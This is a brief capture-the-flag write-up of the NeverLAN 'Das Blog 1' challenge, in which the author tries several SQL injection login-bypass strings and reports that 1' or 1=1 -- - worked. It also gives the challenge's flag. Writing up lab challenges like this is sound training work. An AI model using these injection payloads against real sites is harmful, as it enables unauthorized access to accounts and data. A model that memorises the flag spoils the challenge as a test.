[Das Blog 1]
---
Question:
---
	Word on the street, Johnny's got a blog. Seems he doesn't know how to escape his inputs.
	https://challenges.neverlanctf.com:1125

Answer
---
	1. The task pretty much gives away that it's an escape character sql injection we need.
	2. Tried several escape methods like:

	' or ' 1=1
	' or '1'='1
	1' or 1=1 -- -

	3. 1' or 1=1 -- - ended up working

![alt text](https://i.imgur.com/CnKkYvX.png)

![alt text](https://i.imgur.com/ekTcAX8.png)

![alt text](https://i.imgur.com/P9uOsh8.png)


Flag:
---
	flag{3sc4pe_Y0ur_1npu7s}
